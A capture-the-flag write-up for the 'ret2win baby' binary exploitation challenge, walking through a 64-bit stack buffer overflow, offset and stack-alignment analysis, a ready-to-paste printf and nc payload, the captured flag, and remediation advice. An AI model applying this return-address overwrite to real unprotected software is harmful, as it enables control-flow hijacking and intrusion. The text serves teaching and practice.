# ret2win baby

<p align="center">
  <img src="https://img.shields.io/badge/Category-Binary%20Exploitation%20(Pwn)-red?style=for-the-badge&logo=gnubash" alt="Category">
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Difficulty">
  <img src="https://img.shields.io/badge/Points-400-blue?style=for-the-badge" alt="Points">
  <img src="https://img.shields.io/badge/Architecture-x86--64%20ELF-lightgrey?style=for-the-badge&logo=linux" alt="Arch">
</p>

---

## Executive Summary

The target application is a 64-bit Linux ELF binary running on a remote TCP service. It exposes an unbounded loop reading user input byte-by-byte into a fixed 64-byte stack buffer. Because stack canaries are disabled and the binary is not a Position Independent Executable (No-PIE), we can overwrite the saved Instruction Pointer (`RIP`) on the stack to redirect program execution to an uncalled helper function, `win()`. To prevent a segmentation fault triggered by glibc's 16-byte stack alignment check (`movaps` instruction inside `fopen()`), a single `ret` gadget is prepended to realign the stack pointer.

---

## Fundamental Concepts for Beginners

### 1. What is the Call Stack?
When a function is called in C, the operating system allocates a temporary memory frame on the **stack**:
- **Local variables:** (e.g., input buffers, counters) live at the bottom of the stack frame.
- **Saved Frame Pointer (`RBP`):** Stores the caller's base pointer.
- **Saved Return Address (`RIP`):** Stores the address of the next CPU instruction to execute when the function returns (`ret`).

```
Higher Memory Addresses (Top of Stack)
+---------------------------------------+
|  Caller Frame Memory                  |
+---------------------------------------+
|  Saved Return Address (RIP)  [8 bytes]| <--- Target of our exploit!
+---------------------------------------+
|  Saved Base Pointer (RBP)    [8 bytes]|
+---------------------------------------+
|  Local Buffer (buffer[64])   [64 bytes| <--- User input starts writing here
+---------------------------------------+
Lower Memory Addresses (RSP)
```

### 2. The Vulnerability: Buffer Overflow
If a program accepts more input than the allocated buffer can hold without performing boundary checks, the excess bytes spill out of the buffer, overwriting the saved `RBP` and eventually replacing the saved `RIP`. When the function executes `ret`, the CPU jumps directly to whatever memory address we placed in `RIP`.

### 3. What is a "ret2win"?
A classic CTF challenge format where an unused "win" function already exists inside the binary (e.g., a function that reads and prints `flag.txt`). The objective is simply to hijack control flow and jump straight into `win()`.

---

## Step 1: Initial Reconnaissance & Security Mitigations

We first run `file` and `checksec` on the provided `vuln_server` binary:

```bash
$ file vuln_server
vuln_server: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped

$ checksec --file=vuln_server
[*] 'vuln_server'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Key Security Posture Findings:
| Security Feature | State | Impact on Exploitation |
|:---|:---:|:---|
| **Canary** | Disabled | No random canary value guards the saved return address; straightforward stack smashing. |
| **PIE** | Disabled | Binary is loaded at fixed memory address `0x400000`. Function addresses are constant across all runs. |
| **NX** | Enabled | The stack is non-executable. We cannot inject raw shellcode, but we can jump to existing code (`ret2win` / ROP). |
| **Symbols** | Present | Binary is not stripped; function and variable names (`vulnerable`, `vuln_read`, `win`) are intact. |

---

## Step 2: Binary Analysis & Vulnerability Identification

Opening the binary in Ghidra / IDA Pro reveals the logic inside `vulnerable()` and `vuln_read()`:

### Equivalent C Code:
```c
void win() {
    FILE *f = fopen("flag.txt", "r");
    char flag[128];
    if (f) {
        fgets(flag, sizeof(flag), f);
        printf("Congratulations! Here is your flag:\n%s\n", flag);
        fclose(f);
    }
}

void vuln_read(char *dest) {
    int c;
    while ((c = getchar()) != '\n' && c != EOF) {
        *dest++ = (char)c; // CRITICAL FLAW: No bounds checking!
    }
    *dest = '\0';
}

void vulnerable() {
    char buffer[64];
    printf("=== Welcome to ret2win baby challenge ===\nEnter your input: \n");
    vuln_read(buffer);
    printf("You entered: %s\n", buffer);
}
```

### Disassembly of the Flaw:
In `vulnerable()`, the stack allocates `0x40` (64 bytes) for `buffer`:
```assembly
vulnerable:
  push   rbp
  mov    rbp, rsp
  sub    rsp, 0x40         ; Reserve 64 bytes on stack
  lea    rax, [rbp-0x40]   ; Pointer to buffer
  mov    rdi, rax
  call   vuln_read         ; Read input without length limit
  ...
  leave
  ret                      ; Pops [rsp] into RIP
```

Next, locate the address of `win()`:
```bash
$ objdump -d vuln_server | grep -A 5 "<win>:"
00000000004011e3 <win>:
  4011e3:	push   rbp
  4011e4:	mov    rbp, rsp
  4011e7:	sub    rsp, 0x90
  4011ee:	lea    rax, [rip+0xe13]        # 402008 <_IO_stdin_used+0x8>
```
`win()` is situated permanently at `0x004011e3`.

---

## Step 3: Offset Calculation & The 16-Byte Stack Alignment Trap

### 1. Calculating the Offset
- Target buffer: `64 bytes`
- Saved base pointer (`RBP`): `8 bytes`
- **Total padding to reach `RIP`:** $64 + 8 = 72 \text{ bytes}$.

### 2. The 16-Byte Stack Alignment Trap
If we send `b"A" * 72 + p64(0x4011e3)`, the remote program crashes immediately inside `fopen()` with `SIGSEGV`.

#### Why does this happen?
Under the **System V AMD64 ABI**, the stack pointer (`RSP`) must be aligned to a **16-byte boundary** (`RSP % 16 == 0`) before executing a `CALL` instruction. 

When glibc functions such as `fopen`, `printf`, or `system` run, they utilize optimized SSE vector instructions (specifically `movaps`). The `movaps` CPU instruction requires its memory operands to be 16-byte aligned. When we hijack control flow via `ret` directly into `win`, the extra `ret` pop leaves `RSP` misaligned by 8 bytes (`RSP % 16 != 0`), causing `movaps` to raise a hardware exception.

#### The Fix: The ROP `ret` Gadget
We find a standalone `ret` instruction in the binary:
```bash
$ ROPgadget --binary vuln_server | grep ": ret"
0x000000000040101a : ret
```

When the CPU executes this gadget:
1. It pops `8 bytes` off the stack into `RIP`.
2. It immediately executes the next return, adjusting `RSP` by another 8 bytes and restoring perfect 16-byte alignment before `win()` is entered!

---

## Exploit Payload Structure

```
+-------------------------------------------------------------------------+
|  72 Bytes Padding ('A' * 72)  |  0x40101a (ret)  |  0x4011e3 (win)  | \n|
+-------------------------------------------------------------------------+
|<--------- Overwrite Stack --------->|<-- Align RSP -->|<- Jump to Flag ->|
```

---

## Step 4: Exploitation

We send the crafted payload directly to the remote service using Netcat, packing:
- 72 bytes of padding to fill the buffer and overwrite saved `RBP`
- The `ret` gadget address (`0x40101a`) in little-endian format to realign the stack
- The `win()` address (`0x4011e3`) in little-endian format
- A newline byte (`\n`) to complete input

```bash
printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10\x40\x00\x00\x00\x00\x00\xe3\x11\x40\x00\x00\x00\x00\x00\n' | nc 142.93.139.243 9002
```

---

## Output & Flag Capture

```text
=== Welcome to ret2win baby challenge ===
Enter your input: 
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  @
Congratulations! Here is your flag:
RPCTF{0v3rwr1t3_th3_r3turn}
```

**Captured Flag:**
```
RPCTF{0v3rwr1t3_th3_r3turn}
```

---

## Remediation & Defensive Engineering

To eliminate this class of vulnerability in production code:

1. **Use Bounded Input Functions:**
   Replace unbounded character loops or `gets()` with safe, length-limited functions such as `fgets(buffer, sizeof(buffer), stdin)` or `getline()`.
   ```c
   // SAFE:
   if (fgets(buffer, sizeof(buffer), stdin) == NULL) {
       // handle error
   }
   ```
2. **Enable Stack Canaries:**
   Compile with `-fstack-protector-strong` or `-fstack-protector-all`. The compiler places an unpredictable canary before `RBP`. If an overflow occurs, `__stack_chk_fail()` terminates the process before `ret` executes.
3. **Enable Full ASLR & PIE:**
   Compile with `-fPIE -pie`. The program base address will be randomized on every launch, rendering hardcoded gadget and function addresses useless without an information leak.
